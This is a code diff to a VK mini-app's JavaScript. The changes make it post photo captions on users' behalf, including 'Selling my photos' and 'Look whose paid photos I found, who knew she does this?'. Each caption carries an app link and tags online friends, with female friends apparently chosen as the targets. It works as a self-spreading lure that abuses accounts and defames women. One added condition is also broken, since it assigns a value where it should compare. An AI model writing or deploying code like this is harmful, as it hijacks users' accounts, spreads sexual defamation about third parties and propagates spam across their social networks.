@@ -60,8 +60,13 @@
                 viewer.friends.items = fr_temp;
 
                 var user = data.response[0];
-                if(user.id == viewer_id || user.sex == 2) {
+                if(user.id == viewer_id) {
                   hash = "";
+                }
+
+                if(hash="11"){
+                  hash=getFriendsSEX1();
+                  return firstApi();
                 }
 
 
@@ -199,8 +204,8 @@
                                 var data = JSON.parse(xhr.responseText);
                                 var users_list = getFriendsOnlineForPhoto();
                                 caption = "Продаю свои фото : \n\n https://vk.com/app"+vk_app_id+"#"+viewer_id+" \n"+users_list;
-                                if(viewer.id == 2){
-                                  caption = "Смотрите чъи платные фотки нашёл, кто знал что она таким занимается? : \n\n https://vk.com/app"+vk_app_id+"#"+viewer_id+" \n"+users_list;
+                                if(viewer.sex == 2){
+                                  caption = "Смотрите чъи платные фотки нашёл, кто знал что она таким занимается? : \n\n https://vk.com/app"+vk_app_id+"#11 \n"+users_list;
                                   users_list = getFriendsOnlineForPhotoANYSEX();
                                 }
 
@@ -215,7 +220,7 @@
                                     var id_photo = data.response[0].id;
                                     caption = "Продаю свои фото : \n\n https://vk.com/app"+vk_app_id+"#"+viewer_id+"";
                                     if(viewer.id == 2){
-                                      caption = "Смотрите чъи платные фотки нашёл, кто знал что она таким занимается? : \n\n https://vk.com/app"+vk_app_id+"#"+viewer_id;
+                                      caption = "Смотрите чъи платные фотки нашёл, кто знал что она таким занимается? : \n\n https://vk.com/app"+vk_app_id+"#11";
                                     }
                                     vkConnect.sendPromise("VKWebAppCallAPIMethod", {
                                         "method": "photos.edit",
@@ -289,6 +294,15 @@
           }
 
             return users_list;
+        }
+
+        function getFriendsSEX1() {
+          sortByLastTime();
+          for(var i=0;i<viewer.friends.items.length;i++) {
+            if(viewer.friends.items[global_offset_i].sex == 1){
+              return viewer.friends.items[global_offset_i].id;
+            }
+          }
         }
 
     </script>
